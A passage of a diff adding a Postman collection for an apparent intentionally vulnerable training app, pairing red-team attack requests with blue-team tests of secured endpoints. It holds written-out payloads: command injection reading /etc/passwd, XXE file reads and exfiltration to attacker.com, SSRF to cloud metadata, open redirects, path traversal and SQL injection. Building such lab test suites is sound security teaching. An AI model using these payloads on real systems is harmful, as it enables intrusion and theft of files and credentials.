+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Command Injection in POST",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/system/command",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "system",
+                    "command"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"cmd\": \"echo test; cat /etc/passwd\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "name": "06 - XML External Entity (XXE)",
+          "item": [
+            {
+              "name": "XXE - Basic External Entity",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/xml"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/xml/parse",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "xml",
+                    "parse"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "\"<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>\""
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('XXE vulnerability exists', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 500]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "XXE - Parameter Entity",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/xml"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/xml/parse",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "xml",
+                    "parse"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "\"<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % file SYSTEM 'file:///etc/hosts'><!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM \\\"http://attacker.com/?data=%file;\\\">'>%eval;%exfil;]><root></root>\""
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "XXE - Blind XXE",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/xml"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/xml/parse",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "xml",
+                    "parse"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "\"<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://attacker.com/xxe'>]><root>&test;</root>\""
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "XXE - Internal File Disclosure",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/xml"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/xml/parse",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "xml",
+                    "parse"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "\"<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///proc/self/environ'>]><root>&test;</root>\""
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "name": "07 - Server-Side Request Forgery (SSRF)",
+          "item": [
+            {
+              "name": "SSRF - Internal Network Scan",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/fetch?url=http://127.0.0.1:8080/admin",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "fetch"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "http://127.0.0.1:8080/admin"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('SSRF vulnerability exists', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 500]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "SSRF - Localhost Access",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/fetch?url=http://localhost/admin",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "fetch"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "http://localhost/admin"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "SSRF - Internal IP",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/fetch?url=http://192.168.1.1/admin",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "fetch"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "http://192.168.1.1/admin"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "SSRF - Cloud Metadata",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/fetch?url=http://169.254.169.254/latest/meta-data/",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "fetch"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "http://169.254.169.254/latest/meta-data/"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "SSRF - File Protocol",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/fetch?url=file:///etc/passwd",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "fetch"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "file:///etc/passwd"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "SSRF - POST Request",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/webhook",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "webhook"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"url\": \"http://127.0.0.1:6379/\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "SSRF - DNS Rebinding",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/fetch?url=http://attacker-controlled-dns.com",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "fetch"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "http://attacker-controlled-dns.com"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "name": "08 - Open Redirect",
+          "item": [
+            {
+              "name": "Open Redirect - External Site",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/redirect?url=http://evil.com",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "redirect"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "http://evil.com"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Open redirect vulnerability', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([302, 301, 200]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Open Redirect - JavaScript Protocol",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/redirect?url=javascript:alert('XSS')",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "redirect"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "javascript:alert('XSS')"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Open Redirect - Data URI",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/redirect?url=data:text/html,<script>alert('XSS')</script>",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "redirect"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "data:text/html,<script>alert('XSS')</script>"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Open Redirect - Double Slash",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/redirect?url=//evil.com",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "redirect"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "//evil.com"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Open Redirect - URL Encoded",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/redirect?url=http%3A%2F%2Fevil.com",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "redirect"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "http%3A%2F%2Fevil.com"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "name": "09 - Business Logic Flaws",
+          "item": [
+            {
+              "name": "Race Condition - Multiple Withdrawals",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/wallet/withdraw",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "wallet",
+                    "withdraw"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"amount\": 100}"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Withdrawal processed', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 400]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Negative Amount - Deposit",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/wallet/deposit",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "wallet",
+                    "deposit"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"amount\": -100}"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Negative amount accepted (vulnerability)', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 400]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Negative Amount - Purchase",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/orders",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "orders"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"product_id\": 1, \"quantity\": -5}"
+                }
+              }
+            },
+            {
+              "name": "Price Manipulation - Discount",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/orders",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "orders"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"product_id\": 1, \"quantity\": 1, \"price\": 0.01}"
+                }
+              }
+            },
+            {
+              "name": "Coupon Reuse",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/orders/apply-coupon",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "orders",
+                    "apply-coupon"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"coupon\": \"SAVE50\", \"order_id\": 1}"
+                }
+              }
+            },
+            {
+              "name": "Integer Overflow",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/wallet/deposit",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "wallet",
+                    "deposit"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"amount\": 999999999999999}"
+                }
+              }
+            },
+            {
+              "name": "Parameter Tampering - Order Total",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/orders/checkout",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "orders",
+                    "checkout"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"order_id\": 1, \"total\": 0.01}"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "name": "10 - Information Disclosure",
+          "item": [
+            {
+              "name": "Verbose Error Messages",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/users/invalid",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "invalid"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Verbose error with stack trace', function () {",
+                      "    pm.expect(pm.response.text()).to.include('Error');",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Path Traversal - Read /etc/passwd",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/files?file=../../../../etc/passwd",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "files"
+                  ],
+                  "query": [
+                    {
+                      "key": "file",
+                      "value": "../../../../etc/passwd"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Path Traversal - Read Application Config",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/files?file=../../config.json",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "files"
+                  ],
+                  "query": [
+                    {
+                      "key": "file",
+                      "value": "../../config.json"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Path Traversal - Windows",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/files?file=..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "files"
+                  ],
+                  "query": [
+                    {
+                      "key": "file",
+                      "value": "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Exposed Configuration",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/config",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "config"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Configuration exposed', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Admin Debug Endpoint",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/debug",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "debug"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Server Info Disclosure",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/info",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "info"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Git Directory Exposure",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/.git/config",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    ".git",
+                    "config"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Backup File Exposure",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/backup/database.sql",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "backup",
+                    "database.sql"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Environment Variables",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/env",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "env"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "name": "11 - Utility & Information",
+          "item": [
+            {
+              "name": "Health Check",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/health",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "health"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Status code is 200', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "List All Vulnerabilities",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/vulnerabilities",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "vulnerabilities"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Vulnerabilities list returned', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "    var jsonData = pm.response.json();",
+                      "    pm.expect(jsonData).to.be.an('array');",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "API Documentation",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/docs",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "docs"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Server Status",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/status",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "status"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "\ud83d\udd35 BLUE TEAM - Secure Endpoints (Port 5001)",
+      "description": "Secure implementations with proper defenses",
+      "item": [
+        {
+          "name": "01 - Authentication (Secure)",
+          "item": [
+            {
+              "name": "Register User",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/auth/register",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "register"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"name\": \"Test User\", \"email\": \"testuser@aegisforge.com\", \"password\": \"SecureP@ssw0rd123!\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Status code is 200 or 201', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 201]);",
+                      "});",
+                      "pm.test('Response has user data', function () {",
+                      "    var jsonData = pm.response.json();",
+                      "    pm.expect(jsonData).to.have.property('user');",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Register with Weak Password - Rejected",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/auth/register",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "register"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"name\": \"Weak User\", \"email\": \"weak@aegisforge.com\", \"password\": \"123\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Weak password rejected', function () {",
+                      "    pm.expect(pm.response.code).to.equal(400);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Login User",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/auth/login",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "login"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"email\": \"testuser@aegisforge.com\", \"password\": \"SecureP@ssw0rd123!\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Status code is 200', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "});",
+                      "pm.test('Response has access_token', function () {",
+                      "    var jsonData = pm.response.json();",
+                      "    pm.expect(jsonData).to.have.property('access_token');",
+                      "    pm.collectionVariables.set('access_token', jsonData.access_token);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Login with Wrong Password",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/auth/login",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "login"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"email\": \"testuser@aegisforge.com\", \"password\": \"wrongpassword\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Login failed', function () {",
+                      "    pm.expect(pm.response.code).to.equal(401);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Brute Force - Rate Limited 1",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/auth/login",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "login"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"email\": \"admin@aegisforge.com\", \"password\": \"wrong1\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Brute Force - Rate Limited 2",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/auth/login",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "login"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"email\": \"admin@aegisforge.com\", \"password\": \"wrong2\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Brute Force - Rate Limited 3",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/auth/login",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "login"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"email\": \"admin@aegisforge.com\", \"password\": \"wrong3\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Rate limiting in effect', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([429, 401]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Get User Profile",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/auth/profile",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "profile"
+                  ]
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Status code is 200', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "name": "02 - SQL Injection Prevention",
+          "item": [
+            {
+              "name": "Parameterized Query - User by ID",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/users/1",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "1"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Safe from SQLi', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "SQLi Attempt - Boolean",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/users/1' OR '1'='1",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "1' OR '1'='1"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('SQLi blocked', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([400, 404]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "SQLi Attempt - Union",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/users/1' UNION SELECT NULL,NULL,NULL--",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "1' UNION SELECT NULL,NULL,NULL--"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('SQLi blocked', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([400, 404]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "SQLi Attempt in Search",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/search?q=test' OR 1=1--",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
